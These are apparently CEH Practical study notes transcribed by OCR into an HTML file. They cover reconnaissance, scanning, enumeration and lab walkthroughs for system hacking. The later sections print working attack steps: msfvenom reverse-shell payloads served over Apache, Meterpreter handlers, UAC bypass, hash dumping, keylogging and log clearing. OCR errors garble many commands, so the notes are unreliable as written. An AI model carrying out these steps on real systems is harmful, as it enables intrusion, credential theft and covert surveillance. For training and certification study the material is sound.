@@ -1,0 +1,898 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>CEH Notes Multiple Modules</title>
+</head><body>CEH Practical<br/>
+<br/>
+Whois.net<br/>
+<br/>
+Network footprinting<br/>
+- Pinging - ping<br/>
+<br/>
+Gather an Email List using theHarvester<br/>
+ #theHarvester -d microsoft.com -1 200 -b baidu<br/>
+ #theHarvester -d microsoft.com -1 200 -b google<br/>
+<br/>
+Gather Information using Deep and Dark Web Searching<br/>
+ Tor<br/>
+Determine Target OS Through Passive Footprinting<br/>
+ Censys web service<br/>
+ https://censys.io/domain?q=<br/>
+ <br/>
+Gather Employees' Information from Linkedln using theHarvester<br/>
+ #theHarvester -d eccouncil -l 200 -b linkedin<br/>
+<br/>
+Gather Personal Information from Various Social N etworking Sites using Sherlock<br/>
+ type git clone https://github.com/sherlockproject/sherlock.git<br/>
+cd sherlock<br/>
+ type python3 -m pip instaU -r requirements.txt<br/>
+Once the installation is complete, type cd sherlock and press Enter<br/>
+Now, type python3 sherlock.py satya nadella and press Enter<br/>
+<br/>
+Gather Information using Followerwonk<br/>
+ https://followerwonk.com/analyze<br/>
+<br/>
+<br/>
+Gather information about a target website using ping command line utility<br/>
+ ping www.certifiedhacker.com<br/>
+ ping www.certifiedhacker.co -f -1 1500<br/>
+ ping www.certifiedhacker.com -f -11472<br/>
+ping www.certifiedhacker.com -i 3<br/>
+<br/>
+<br/>
+Gather Information about a Target Website using Website Informer<br/>
+ https://website.informer.com<br/>
+ www.certifiedhacker.com<br/>
+<br/>
+Extract a Company's Data using Web Data Extractor<br/>
+ <br/>
+<br/>
+Mirror a Target Website using HTTrack Web Site Copier<br/>
+ <br/>
+Gather a Wordlist from the Target Website using CeWL<br/>
+ cewl -d 2 -m 5 www.certifiedhacker.com<br/>
+ cewl -w wordlist.txt -d 2 -m 5 www.certifiedhacker.com<br/>
+<br/>
+Gather information about a target by tracing emails using eMailT rackerPro<br/>
+ <br/>
+<br/>
+Perform Whois Lookup using DomainTools<br/>
+http://whois.domaintools.com<br/>
+<br/>
+Gather DNS information using nslookup command line utility and online tool<br/>
+nslookup<br/>
+http://www.kloth.net/services/nslookup.php<br/>
+<br/>
+Perform Reverse DNS Lookup using Reverse IP Domain Check and DNSRecon<br/>
+https://www.yougetsignal.com<br/>
+dnsrecon -r 162.241.216.0-162.241.216.255<br/>
+<br/>
+Perform N etwork Tracerouting in Windows and Linux<br/>
+Machin es<br/>
+https://www.arin.net/about/welcome/region - locate the network range using the ARIN Whois database search tool<br/>
+tracert www.certifiedhacker.com<br/>
+tracert -h 5 www.certifiedhacker.com<br/>
+<br/>
+-h - use for maximum hops<br/>
+<br/>
+traceroute www.certifiedhacker.com<br/>
+<br/>
+Perform Advanced Network Route Tracing Using Path Analyzer Pro<br/>
+<br/>
+F ootprinting a Target using Recon-ng<br/>
+Recon-ng<br/>
+<br/>
+F ootprinting a Target using Maltego<br/>
+maltego<br/>
+<br/>
+Footprinting a Target using OSRFramework<br/>
+git clone https://github.com/i3visio/osrframework<br/>
+pip3 instaU osrframework<br/>
+pip3 install osrframework --upgrade<br/>
+usufy.py -n &lt;target user name or profile name&gt; -p &lt;target platform&gt;<br/>
+ -n - nick names to specify<br/>
+ -p - platforms to search<br/>
+<br/>
+domainfy.py -n (Domain Name] -t all<br/>
+ - n - specify the domain name<br/>
+ -t 0- <br/>
+ex: domainfy.py -n eccouncil -t all<br/>
+<br/>
+searchfy.py - Gathers information about the users on social<br/>
+networking pages<br/>
+mailfy.py - Gathers information about email accounts<br/>
+phonefy.py - Checks for the existence of a given series of phones<br/>
+entify.py - Extracts entities using regular expressions from provided URLs<br/>
+<br/>
+Footprinting a Target using FOCA<br/>
+Footprinting a Target using BillCipher<br/>
+git clone https://github.com/GitHackTools/BiiiCipher<br/>
+<br/>
+python3 billcipher.py<br/>
+<br/>
+Footprinting a Target using OSINT Framework<br/>
+https:l/osintframework.com/<br/>
+<br/>
+NMAP<br/>
+#service postgresql start<br/>
+#msfconsole<br/>
+#db_status<br/>
+#msfdb init<br/>
+#service postgresql restart<br/>
+#msfconsole<br/>
+#nmap -Pn -sS -A -oX test 10.10.10.0/24<br/>
+#db_import test<br/>
+#hosts<br/>
+#db_nmap -sS -A 10.10.10.19<br/>
+#services<br/>
+#use scanner/smb/smb_version<br/>
+#show options<br/>
+#set RHOSTS 10.10.10.19<br/>
+#set THREADS 100<br/>
+#run<br/>
+#show options<br/>
+#set RHOSTS 10.10.10.1-19<br/>
+<br/>
+Perform Host Discovery using Nmap<br/>
+<br/>
+nmap -sn -PE &lt;Target Range of IP Addresses&gt; - for ICMB Echo scan<br/>
+<br/>
+<br/>
+ICMP timestamp ping scan<br/>
+# nmap -sn -PP &lt;target IP address&gt;<br/>
+ICMP address mask ping scan<br/>
+# nmap -sn -PM &lt;target IP address&gt;<br/>
+<br/>
+TCP SYN Ping Scan : - # nmap -sn -PS &lt;target IP address&gt;<br/>
+<br/>
+TCP ACK Ping Scan: - # nmap -sn -PA &lt;target IP address&gt;<br/>
+<br/>
+IP P rotocol Ping Scan - # nmap -sn -PO &lt;target IP address&gt;<br/>
+<br/>
+Perform Host Discovery using Angry IP Scanner<br/>
+<br/>
+Perform port and service discovery using MegaPing<br/>
+<br/>
+Perform Port and Service Discovery using NetScanTools Pro<br/>
+<br/>
+IDLE/ IPID Reader Scan<br/>
+# nmap -sl -v &lt;target IP address&gt;<br/>
+<br/>
+SCTP INIT Scan:<br/>
+# nmap -sY -v &lt;target IP address&gt;<br/>
+<br/>
+<br/>
+nmap -sV &lt;Target IP<br/>
+Address&gt;<br/>
+<br/>
+nmap -A &lt;Target Subnet&gt; - aggressive scan (10.10.10.*) - Note: -A: enables aggressive scan. The aggressive scan option supports OS<br/>
+detection (-0 ), version scanning (-sV), script scanning (-sC), and traceroute<br/>
+(--traceroute). You should not use -A against target networks without pernuss10n. <br/>
+<br/>
+nmap -sV &lt;Target IPAddress&gt; - -sV: detects service versions<br/>
+<br/>
+Explore Various Network Scanning Techniques using Hping3<br/>
+<br/>
+type hping3 -A &lt;Target IP Address&gt; -p 80 -c 5<br/>
+<br/>
+hping3 -a 10.10.10.16 -p 80 -c 5<br/>
+<br/>
+hping3 -8 0-100 -S &lt;Target IP Address&gt; -V<br/>
+<br/>
+hping3 --scan 0-100 -S &lt;Target IP Address&gt;<br/>
+<br/>
+--scan - port range to scan<br/>
+-S - for sync flag<br/>
+ICMP scan: hping3 -1 &lt;Target IP Address&gt; -p 80 -c 5<br/>
+<br/>
+Entire subnet scan for live host: <br/>
+hping3 -1 &lt;Target Subnet&gt; -rand-c:test -1 ethO<br/>
+UDP scan: hping3 -2 &lt;Target IP Address&gt; -p 80 -c 5<br/>
+<br/>
+Perform OS Discovery<br/>
+<br/>
+Identify the target system's OS with Time-to-Live (ITL) and TCP<br/>
+window sizes using Wireshark<br/>
+<br/>
+<br/>
+Perform OS discovery using N map Script Engine (NSE)<br/>
+nmap -A &lt;Target IP Address&gt; - The scan results appear, displaying the open ports and running services<br/>
+along with their versions and target details such as OS, computer name,<br/>
+NetBIOS computer name, etc. under the Host script results section.<br/>
+<br/>
+<br/>
+Perform OS discovery using Unicornscan<br/>
+<br/>
+nmap -0 &lt;Target IP Address&gt;<br/>
+nmap --script smb-os-discovery.nse &lt;Target IP Address&gt;<br/>
+<br/>
+unicornscan &lt;Target IP Address&gt; -lv<br/>
+<br/>
+-I - Immediate mode<br/>
+v - verbose mode<br/>
+<br/>
+Scan beyond IDS I firewall using various evasion techniques<br/>
+nmap -f &lt;Target IP Address&gt; - -f switch is used to split the IP packet into tiny fragment packets<br/>
+<br/>
+nmap -g 80 &lt;Target IP Address&gt; - In this command, you can use the -g or --source-port option to perform<br/>
+source port manipulation.<br/>
+<br/>
+nmap -mtu 8 &lt;Target IP Address&gt; - In this command, -mtu: specifies the number of 1viaximum<br/>
+Transmission Unit (MTU) (here, 8 bytes of packets).<br/>
+<br/>
+<br/>
+nmap -D RND:1 0 &lt;Target IP Address&gt; - In this command, -D: performs a decoy scan and RND: generates a<br/>
+random and non-reserved IP addresses.<br/>
+<br/>
+Create Custom UDP and TCP Packets using Hping3 to Scan<br/>
+beyond IDS/Firewall<br/>
+<br/>
+hping3 &lt;Target IP Address&gt; --udp --rand-source --data 500<br/>
+<br/>
+Note: Here, --udp specifies sending the UDP packets to the target host, -rand-<br/>
+source enables the random source mode and -data specifies the packet<br/>
+body size.<br/>
+Figure<br/>
+<br/>
+Create Custom Packets using Nmap to Scan beyond<br/>
+IDS / Firewall<br/>
+<br/>
+nmap &lt;Target IP Address&gt; --data Oxdeadbeef  -- N map uses --data &lt;hex string&gt; (here, Oxdeadbeef) to send the binary<br/>
+data (o's and 1 's) as payloads in the sent packets to scan beyond firewalls.The scan results appear, displaying all open TCP ports and services.<br/>
+<br/>
+nmap &lt;Target IP Address&gt; --data-string &quot;Ph34r my 133t skills&quot;<br/>
+<br/>
+<br/>
+Browse Anonymously using CyberGhost VPN<br/>
+<br/>
+Draw network diagrams using Network Topology Mapper.<br/>
+<br/>
+Scan a target network using Metasploit<br/>
+<br/>
+service postgresql start<br/>
+msfconsole<br/>
+db_status<br/>
+if db not connected exit and do again<br/>
+msfdb init<br/>
+service postgresql restart<br/>
+msfconsole<br/>
+db_status<br/>
+nmap -Pn -ss -A -oX Test 10.10.10.0/24<br/>
+db_import Test<br/>
+hosts<br/>
+services or db_services<br/>
+search portscan<br/>
+use auxiliary/scanner/portscan/syn<br/>
+To do so, issue the below commands:<br/>
+set INTERFACE ethO<br/>
+set PORTS 80<br/>
+set RH OSTS 1 0.1 0.1 0.5-20<br/>
+set THREADS 50<br/>
+type run, and press Enter<br/>
+after results<br/>
+type back and enter<br/>
+use auxiliary/scanner/portscan/tcp and press Enter<br/>
+Type hosts -R and press Enter<br/>
+Type set RHOSTS &lt;Target IP Address&gt; and press Enter.<br/>
+run<br/>
+we will use the module scanner/smb/version to determine which version ofWindows is running on a target and which Samba version is on a Linux host.<br/>
+type back, and then press Enter<br/>
+type use auxiliary/scanner/smb/smb_version and<br/>
+press Enter.<br/>
+address range (10.10.10.5-20)<br/>
+set RH OSTS 1 0.1 0.1 0.5-20<br/>
+set THREADS 11<br/>
+run and enter<br/>
+Type back and press Enter<br/>
+type use auxiliary/scanner/ftp/ftp_version and press Enter.<br/>
+Type set RHOSTS 10.10.10.10 and press Enter<br/>
+Type run and press Enter<br/>
+hosts<br/>
+You can further export this information to a CSV file. To do so, first<br/>
+type back, and then press Enter. Now, type hosts -o<br/>
+/root/Desktop/Metasploit_Scan_Results.csv and press Enter.<br/>
+<br/>
+Perform NetBIOS enumeration using Windows command-line utilities<br/>
+<br/>
+from windows 2019 machine --&gt; nbtstat -a &lt;IP address of the remote machine&gt;<br/>
+In the same Command Prompt window, type nbtstat -c and press Enter.<br/>
+Note: In this command, -c lists the contents of the NetBIOS name cache of<br/>
+the remote computer.<br/>
+<br/>
+net use and enter<br/>
+<br/>
+Perform NetBIOS Enumeration using NetBIOS Enumerator<br/>
+Perform N etBIOS Enumeration using an NSE Script<br/>
+ In the Windows 10 virtual machine, dick on the Start button on the leftbottom<br/>
+corner of Desktop and launch Nmap - Zenmap GUI from<br/>
+nmap -sV -v --script nbstat.nse &lt;Target IP Address&gt;<br/>
+<br/>
+type nmap -sU -p 137 -script nbstat.nse &lt;Target IP Address&gt;<br/>
+NetBIOS port (137)<br/>
+<br/>
+Perform SNMP enumeration using snmp-check<br/>
+type nmap -sU -p 161 &lt;Target IP address&gt; - 10.10.10.16<br/>
+type snmp-check &lt;Target IP Address&gt; - 10.10.10.16<br/>
+<br/>
+Perform SNMP Enumeration using SoftPerfeet N etwork Scanner<br/>
+we will use the SoftPerfeet Network Scanner to perform SNMP enumerauon on a target system.<br/>
+<br/>
+Perform LDAP enumeration using Active Directory Explorer (AD Explorer)<br/>
+<br/>
+Perform NFS enumeration using RPCScan and SuperEnum<br/>
+type nmap -p 2049 &lt;Target IP Address&gt; (in this case,10.10.10.19)<br/>
+type git clone<br/>
+https://github.com/p4pentest/SuperEnum and press Enter to download the SuperEnrun repository.<br/>
+type cd SuperEnum and press Enter to navigate to the SuperEnum tool folder.<br/>
+Type echo &quot;1 0.10.10.19&quot; &gt;&gt; Target.txt and press Enter to create a target file containing IP address.<br/>
+Type ./superenum and press Enter. Under Enter IP Listfilename with path, type Target.txt, and press Enter.<br/>
+Now, we will perform NFS enumeration using RPCScan. To do so, in the<br/>
+terminal window, type git clone https://github.com/hegusung/RPCScan<br/>
+and press Enter to download the RPCScan repository.<br/>
+<br/>
+After the download completes, navigate to the RPCScan folder by typing cd<br/>
+RPCcan and press Enter.<br/>
+Type python3 rpc-scan.py &lt;Target IP address&gt; --rpc (in this case, the<br/>
+target IP address is 10.10.10.19, the Windows Server 2019 virtual<br/>
+machine); press Enter.<br/>
+<br/>
+Note: -rpc: lists the RPC (portmapper); the target IP address may differ in your<br/>
+lab environment.<br/>
+<br/>
+This concludes the demonstration of performing NFS enumeration using<br/>
+SuperEnum and RPCScan.<br/>
+<br/>
+Perform DNS enumeration using zone transfer<br/>
+In the terminal window, type dig ns &lt;Target Domain&gt; (in this case, the<br/>
+target domain is www.certifiedhacker.com); press Enter.<br/>
+Note: In this command, ns returns name servers in the result.<br/>
+<br/>
+In the terminal window type dig @&lt;Name Server&gt; &lt;Target Domain&gt; axfr<br/>
+(in this example, the name server is ns1.bluhost.com and the target domain<br/>
+is www.certifiedhacker.com); press Enter<br/>
+Note: In this command, axfr retrieves zone information.<br/>
+<br/>
+Command Prompt window appears; type nslookup, and press Enter.<br/>
+In the nslookup interactive mode, type set querytype=soa, and press Enter.<br/>
+Type the target domain certifiedhacker.com and press Enter. This resolves<br/>
+the target domain information.<br/>
+<br/>
+Note: set querytype=soa sets the query type to SOA (Start of Authority) record<br/>
+to retrieve administrative information about the DNS zone of the target domain<br/>
+certifiedhacker.com.<br/>
+<br/>
+In the nslookup interactive mode, type ls -d &lt;Name Server&gt; (in this<br/>
+example, the name is ns1.bluehost.com) and press Enter, as shown in the<br/>
+screenshot.<br/>
+<br/>
+Note: In dus command, ls -d requests a zone transfer of the specified name<br/>
+server.<br/>
+<br/>
+Perform DN S Enumeration using DN SSEC Zone Walking<br/>
+Here, we will use the DNSRecon tool to perform DNS enumeration through DNSSEC zone walking.<br/>
+Type dnsrecon -h and press Enter to view all the available options in the DNSRecon tool.<br/>
+Type dnsrecon -d &lt;Target domain&gt; -z (in this example, the target domain is www.certifiedhacker.com); press Enter.<br/>
+dnsre<br/>
+<br/>
+Perform RPC and SMB enumeration using NetScanTools Pro<br/>
+Perform RPC, SMB, and FTP Enumeration using Nmap<br/>
+type nmap -p 21 &lt;Target IP Address&gt;<br/>
+type nmap -T4 -A &lt;Target IP Address&gt;<br/>
+T4 - 0 to 5<br/>
+-A - ACK flag<br/>
+<br/>
+<br/>
+type nmap ·P &lt;Target Port&gt; ·A &lt;Target IP Address&gt;<br/>
+<br/>
+E numerate information using Global Network Inventory<br/>
+E numerate N etwork Resources using Advanced IP Scanner<br/>
+Enumerate Information from Windows and Samba Hosts using<br/>
+Enum4linux<br/>
+<br/>
+<br/>
+Vulnerabiliry asseJsment<br/>
+<br/>
+Perform vulnerability research in Common Weakness Enumeration<br/>
+(CWE)<br/>
+<br/>
+The following are some of the vulnerability scoring systems and databases:<br/>
+•<br/>
+Common Weakness Enumeration (CWE)<br/>
+Common Vulnerabilities and Exposures (CVE)<br/>
+National Vulnerability D atabase (NVD)<br/>
+Common Vulnerability Scoring System (CVSS)<br/>
+https:l/cwe.mitre.org/<br/>
+<br/>
+Perform Vulnerability Research in Common Vulnerabilities and<br/>
+Exposures (CVE)<br/>
+<br/>
+Perform Vulnerability Research m National Vulnerability<br/>
+Database (NVD)<br/>
+<br/>
+navigate to https://nvd.nist.gov/<br/>
+<br/>
+NATIONAL VULNERABILITY DATABASE website appears: the recently<br/>
+discovered vulnerabilities can be viewed.<br/>
+<br/>
+Base Score:inherent qualities of a vulnerability.<br/>
+Temporal Score:Represents the qualities of the vulnerability that<br/>
+change over time<br/>
+Environmental score:qualities of the vulnerability hat are specific to the affected user's env1ronment.<br/>
+Overall Score:Sum total of both the scores (CVSS Base Score, CVSS<br/>
+Temporal Score).<br/>
+<br/>
+Perform Vulnerability Analysis using OpenVAS<br/>
+<br/>
+Perform Vulnerability Scanning using N essus<br/>
+<br/>
+Perform Vulnerability Scanning using GFI LanGuard<br/>
+<br/>
+Perform Web Servers and Applications Vulnerability Scanning using CGI Scanner Nikto<br/>
+we will target the www.certifiedhacker.com website<br/>
+Type nikto -H and press Enter to view various available commands with full<br/>
+help text<br/>
+type nikto -h &lt;Target Website&gt; -Tuning x (here,the target website is www.certifiedhacker.com) and press Enter.<br/>
+Note: -h: specifies the target host and x: specifies the Reverse Tuning options (i.e., include all except specified)<br/>
+type nikto -h &lt;Target Website&gt; -Cgidirs all, here, the target website is www.certifiedhacker.com) and hit Enter.<br/>
+Note: -Cgidirs: scans the specified CGI directories; users can use filters such as &quot;none&quot; or &quot; all&quot; to scan all CGI directories or none).<br/>
+<br/>
+we will save the scan results in the form of a text file<br/>
+<br/>
+type cd Desktop and press Enter.<br/>
+Type nikto -h &lt;Target IP Address&gt; -o &lt;File_Name&gt; -F txt and press Enter.<br/>
+Note: -h: specifies the target, -o: specifies the name of the output ftle, and -F:specifies the file format.<br/>
+<br/>
+<br/>
+System hacking - M06<br/>
+Perform Active Online Attack to Crack the System's Password using Responder<br/>
+Note: In this task, we will use the Ubuntu (10.10.10.9) virtual machine as the host machine and the Windows 10 (10.10.10.10) virtual machine as the target machine.<br/>
+<br/>
+type git clone https://github.com/SpiderLabs/Responder<br/>
+<br/>
+cd Responder and press Enter<br/>
+Type chmod +x Responder.py<br/>
+type sudo ./Responder.py -1 ens33 and press Enter.<br/>
+<br/>
+type sudo snap instaU john-the-ripper, and press Enter.<br/>
+<br/>
+type sudo john /home/ubuntu/Responder/logs/&lt;Log File Name.txt&gt; and press Enter.<br/>
+Note: The log file name will differ in your lab environment. Here, the log file name is SMB-NTLMv2-SSP-10.10.10.10.txt.<br/>
+<br/>
+<br/>
+Audit System Passwords using LOphtCrack<br/>
+<br/>
+Find Vulnerabilities on Exploit Sites<br/>
+Here, we attempt to find the vulnerabilities of the target system using various exploit sites such as Exploit DB and Security Focus.<br/>
+navigate to https://www.exploit-db.coml<br/>
+<br/>
+Similarly, you can search vulnerabilities and download their exploit from<br/>
+the SecurityFocus website.<br/>
+https://www.securityfocus.com<br/>
+<br/>
+Exploit Client-Side Vulnerabilities and Establish a VNC Session<br/>
+<br/>
+In the Parrot Terminal window; type msfvenom ·P windows/meterpreter/reverse_tcp --platform windows -a x86 ·f exe LHOST=&lt;IP Address of Host Machine&gt; LPORT=444 -o /root/Desktop/Test.exe and press Enter.<br/>
+Note: Here, the IP address of the host machirre .is 10.10.10.13 (Parrot Security virtual machine).<br/>
+Type mkdir /var/www/htmllshare and press Enter to create a shared folder<br/>
+Type chmod -R 755 /var/www/html/share and press Enter<br/>
+Type chown -R www-data:www-data /var/www/htmllshare and press Enter<br/>
+Copy the malicious file to the shared location by typing <br/>
+cp /root/Desktop/Test.exe /var/www/html/share and pressing Enter<br/>
+Now, statt the apache service. To do this, type service apache2 start and press Enter.<br/>
+<br/>
+Type msfconsole and press Enter to launch the Metasploit framework.<br/>
+In msfconsole, type use exploit/multi/handler and press Enter.<br/>
+<br/>
+Now, set the payload, LHOST, and LPORT.<br/>
+<br/>
+Type # set payload windows/meterpreter/reverse_tcp and press Enter<br/>
+Type set LHOST 10.10.10.13 and press Enter<br/>
+Type set LPORT p and press Enter<br/>
+<br/>
+http://1 0.1 0.1 0.13/share<br/>
+Click Test.exe to download the ftie.<br/>
+Now, open another Panot Tenninal and navigate to the root directory<br/>
+In the Terminal window, type git clone https://github.com/PowerSheiiMafia/PowerSploit and press Enter. The<br/>
+PowerSploit repository is downloaded to the root directory.<br/>
+Now, switch back to the Terminal window with an active Meterpreter<br/>
+session. Type upload /root/PowerSploit/Privesc/PowerUp.ps1 PowerUp.ps1<br/>
+and press Enter. This command uploads the PowerSploit file<br/>
+(PowerUp.ps1) to d1e target system's present working directory.<br/>
+<br/>
+Type shell and press Enter to open a shell session. Observe d1at the<br/>
+present working directory points to the Downloads folder in the target system.<br/>
+<br/>
+Type powersheii-ExecutionPolicy Bypass -Command &quot;·<br/>
+.\PowerUp.ps1;1nvoke-AIICheck.s&quot; and press Enter to run the PowerUp.ps1<br/>
+file.<br/>
+<br/>
+Now, type exit and press Enter to revert to the Meterpreter session.<br/>
+<br/>
+<br/>
+Gain Access to a Remote System using Armitage<br/>
+In the terminal window, type service postgresql start and press Enter to<br/>
+start the database service.<br/>
+Click on Hosts from the Menu bar and navigate to Nmap Scan -7 lntense<br/>
+Scan to scan for live hosts in the network.<br/>
+<br/>
+Hack a Windows Machine with a Malicious Office Document<br/>
+using TheFatRat<br/>
+<br/>
+In the Parrot Terminal window, type git clone<br/>
+https://github.com/Screetsec/TheFatRat and press Enter.<br/>
+<br/>
+chmod +x tatrat and Enter<br/>
+chmod +x Jsetup.sh and Enter<br/>
+chmod +x Jpowerfull.sh and Enter<br/>
+<br/>
+Type ./setup.sh and hit Enter to begin the installation. Press Enter when the<br/>
+Press [ENTER] key to continue setup message appears.<br/>
+<br/>
+After the installation completes, the Tenninal window appears. Under Select<br/>
+one of the options bellow, type 2 to choose the [2] InstaU Searchsploit<br/>
+from Kali Repository option and press Enter.<br/>
+<br/>
+Under the prompt, so you can runtatrat from anywhere in your terminal<br/>
+and desktop ? , type y and press Enter.<br/>
+<br/>
+After the installation finishes, in the Terminal window, type tatrat and press<br/>
+Enter.<br/>
+<br/>
+<br/>
+Perform Buffer Overflow Attack to Gain Access to a Remote<br/>
+System<br/>
+<br/>
+This vulnerable server is attached to Immunity<br/>
+Debugger.<br/>
+<br/>
+21. In the Terminal window, type nc -nv 10.10.10.10 9999 and press Enter.<br/>
+To create a spike template for spiking on the STA TS function, type pluma<br/>
+stats.spk and press Enter to open a text editor.<br/>
+Now, in the terminal window, type generic_send_tcp 10.10.10.10 9999<br/>
+stats.spk 0 0 and press Enter to send the packages to the vulnerable<br/>
+server.<br/>
+<br/>
+<br/>
+Privilege eJcalation iJ the proceJJ rf uJing a non-admin uJer account to gain a higher Ievel rf acces:s in the target !}Jtem) induding admin privilegeJ.<br/>
+Escalate privileges using privilege escalation tools and exploit client -side vulnerabilities<br/>
+In the terminal window, type <br/>
+msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -e x86/shikata_ga_nai -b '&quot;\xOO&quot; LHOST=10.10.10.13 -f exe &gt;Desktop/Exploit.exe and press Enter.<br/>
+<br/>
+Type mkdir /var/www/htmllshare and press Enter to create a shared folder<br/>
+Type chmod -R 755 /var/www/html/share and press Enter<br/>
+Type chown -R www-data:www-data /var/www/htmllshare and press Enter<br/>
+Type ls -Ia /var/www/htmll 1 grep share and press Enter.<br/>
+12. To copy the Exploit.exe ftle into the shared folder, type cp<br/>
+/root/Desktop/Exploit.exe /var/www/html/share/ and press Enter.<br/>
+13. Type service apache2 start and press Enter tostart the Apache server.<br/>
+<br/>
+Type use exploit/multi/handler and press Enter to handle exploits<br/>
+launched outside the framework.<br/>
+<br/>
+Type use exploit/multi/handler and press Enter to handle exploits<br/>
+launched outside the framework.<br/>
+Type set payload windows/meterpreter/reverse_tcp and press<br/>
+Enter toset a payload.<br/>
+Type set LHOST 10.10.10.13 and press Enter toset the localhost.<br/>
+<br/>
+To start the handler, type the command exploit -j -z and press Enter.<br/>
+<br/>
+In the Terminal window, you can see that the Meterpreter session has successfully been opened.<br/>
+Type sessions -i 1 and press Enter (here, 1 is the id number of the session). Meterpreter shell is launched, as shown in the screenshot.<br/>
+Type getuid and press Enter.<br/>
+<br/>
+<br/>
+Now, type msfconsole in the terminal and press Enter<br/>
+<br/>
+Type use exploit/multi/handler and press Enter<br/>
+<br/>
+Type set payload windows/meterpreter/reverse_tcp and press<br/>
+Enter toset a payload.<br/>
+Set LHOST 10.10.10.13<br/>
+To start the handler, type the command exploit -j -z and press Enter<br/>
+Type sessions -i 1 and press Enter<br/>
+switch back to the Tenninal window with an active meterpreter<br/>
+session. Type upload /home/attacker/Desktop/BeRootlbeRoot.exe and press<br/>
+Enter.<br/>
+<br/>
+Type shell and press Enter<br/>
+Type beRoot.exe and press Enter to run the BeRoot tool.<br/>
+Now, let us check our current system privileges by executing the run<br/>
+post/windows/gather/smart_hashdump command.<br/>
+<br/>
+N ote: In this task, we will bypass Windows UAC protection via the FadHelper<br/>
+Registry Key. It is present in Metasploit as a bypassuac_fodhelper exploit.<br/>
+<br/>
+Type background and press Enter.<br/>
+<br/>
+Now, we will use the bypassuac_fodhelper exploit for windows. To do<br/>
+so, type use exploit/windows/local/bypassuac_fodhelper and press<br/>
+Enter.<br/>
+<br/>
+Now that we have configured the exploit, our next step will be toset<br/>
+and configure a payload. To do so, type set payload<br/>
+windows/meterpreter/reverse_tcp and press Enter. This will set the<br/>
+meterpreter/reverse_tcp payload.<br/>
+<br/>
+Type the command run post/windows/gather/smart_hashdump<br/>
+<br/>
+H ack a Windows Machine using Metasploit and Perform PostExploitation<br/>
+using Meterpreter<br/>
+<br/>
+Before beginning this lab, create a text file named secret.txt in the<br/>
+Windows 10 virtual machine;<br/>
+<br/>
+Type the command msfvenom -p windows/meterpreter/reverse_tcp -platform<br/>
+windows -a x86 -e x86/shikata_ga_nai -b '&quot;\xOO&quot;<br/>
+LHOST=10.10.10.13 -f exe &gt; Desktop/Backdoor.exe and press Enter.<br/>
+<br/>
+Type cp /root/Desktop/Backdoor.exe /var/www/html/share/ and press<br/>
+Enter to copy the file to the share folder.<br/>
+<br/>
+Type the command<br/>
+service apache2 start and press Enter.<br/>
+<br/>
+Now, type the command msfconsole and press Enter to launch<br/>
+Metasploit.<br/>
+<br/>
+Type use exploit/multi/handler and press Enter to handle exploits<br/>
+launched outside of the framework<br/>
+<br/>
+Type set payload windows/meterpreter/reverse_tcp and press<br/>
+Enter<br/>
+<br/>
+Type set LHOST 10.10.10.13 and press Enter<br/>
+<br/>
+To start the handler, type exploit -j -z and press Enter.<br/>
+<br/>
+Type sessions -i 1 and press Enter<br/>
+<br/>
+Type ipconfig and press Enter.<br/>
+<br/>
+To view the mace attributes of secret.txt, type timestomp secret.txt -v<br/>
+and press Enter<br/>
+Type keyscan_start<br/>
+and press Enter to start capturing all keyboard input from the target<br/>
+system.<br/>
+<br/>
+Switch to the Parrot Security virtual machine, type keyscan_dump, and<br/>
+press Enter.<br/>
+<br/>
+Power Spy located<br/>
+Spytech SpyAgent<br/>
+Snow located<br/>
+OpenStego<br/>
+<br/>
+User System Monitoring and Surveillance using Power Spy<br/>
+<br/>
+Hide Files using NTFS Streams<br/>
+<br/>
+Hide Data using White Space Steganography<br/>
+<br/>
+T ype snow -C -m &quot;My swiss bank account number is 45656684512263&quot; •<br/>
+p &quot;magic&quot; readme.txt readme2.txt and press Enter.<br/>
+<br/>
+Now, type snow -C -p &quot;magic&quot; readme2.txt. It will show the content of<br/>
+readme.txt<br/>
+<br/>
+Image Steganography using OpenStego<br/>
+<br/>
+Covert Channels using Covert_TCP<br/>
+<br/>
+Type mkdir Send and press Enter to create a folder named Sendon Desktop<br/>
+Type cd Send and press Enter to change the current working clirectory to the Send folder.<br/>
+Now, type echo &quot;Secret Message&quot;&gt; message.txt and press Enter to make<br/>
+a new text file named message containing the string &quot;Secret Message.&quot;<br/>
+<br/>
+Terminal window, type cc -o covert_tcp covert_tcp.c,<br/>
+and press Enter. This compiles the covert_tcp.c file.<br/>
+Switch to the Ubuntu virtual machine<br/>
+In the Terminal window, type sudo su and press Enter to gain super-user<br/>
+access.<br/>
+<br/>
+Tostart a listener, type ./covert_tcp -dest 10.10.10.9 -source 10.10.10.13-<br/>
+source_port 9999 -dest_port 8888 -server -file<br/>
+/home/ubuntu/Desk.top/Receive/receive.txt and press Enter, as shown in<br/>
+the screenshot.<br/>
+<br/>
+View, enable, and clear audit policies using Auditpol<br/>
+<br/>
+View, Enable, and Clear Audit Policies using Auditpol<br/>
+<br/>
+A Command Prompt window with Administrator privileges appears. Type<br/>
+auditpol /get /eategory:* and press Enter to view a1l the audit policies.<br/>
+<br/>
+Type auditpol /set /eategory:'&quot;system'','&quot;aeeount logon'&quot; /sueeess:enable<br/>
+/failure:enable and press Enter to enable the audit policies.<br/>
+<br/>
+Clear Windows Machine Logs using Various U tilities<br/>
+<br/>
+In Command Prompt, type cipher lw:&lt;Drive or Folder or File Location&gt; and<br/>
+press Enter to deleted files in a specific drive, folder, or file.<br/>
+<br/>
+Clear Linux Machine Logs using the BASH Shell<br/>
+<br/>
+In the Terminal window, type history -c and press Enter to clear the<br/>
+stored history.<br/>
+<br/>
+Gain Control over a Victim Machine using the njRAT RAT<br/>
+Trojan<br/>
+<br/>
+Hide a Trojan using SwayzCryptor and Make it Undetectable<br/>
+to Various Anti-Virus Programs<br/>
+<br/>
+Create a Server using the ProRat T ool<br/>
+<br/>
+<br/>
+<br/>
+Create a Trojan Server using TheefRAT Trojan<br/>
+<br/>
+Create a virus using the JPS Virus Maker Tool and infect the target system<br/>
+<br/>
+Malware anafysis is the process o/ rever:re engineering a Jpecific piece o/ malware to<br/>
+determine its origin) fumtionali~ and potential impact.<br/>
+Perform Online Malware Scanning using VirusTotal<br/>
+<br/>
+The BinText main window appears; d ick Browse to provide a file to<br/>
